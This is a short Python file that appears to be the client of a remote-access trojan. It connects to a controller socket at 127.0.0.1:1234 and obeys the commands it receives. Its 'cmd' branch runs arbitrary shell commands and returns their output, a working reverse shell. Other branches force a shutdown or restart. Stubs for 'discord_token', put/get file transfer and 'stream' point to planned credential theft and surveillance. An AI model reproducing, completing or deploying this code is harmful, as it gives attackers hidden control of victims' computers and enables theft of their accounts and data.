import socket
import os
import subprocess
# os.popen(cmd).read().encode()

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('127.0.0.1', 1234))

while True:
    cmd = s.recv(1024).decode()

    if cmd == 'discord_token':
        ...
    
    elif cmd == 'shutdown':
        os.system('shutdown /s')
    
    elif cmd == 'restart':
        os.system('shutdown /r')
    
    elif cmd == 'sleep':
        ...
    
    elif cmd == 'put':
        ...
    
    elif cmd == 'get':
        ...
    
    elif cmd == 'cmd':
        cmd = s.recv(1024).decode()
        answer = subprocess.getoutput(cmd)
        if not answer or answer == '':
            answer = 'Command executed'
        s.send(answer.encode())
    
    elif cmd == 'stream':
        ...
    
    elif cmd == 'start':
        ...
    
    else:
        break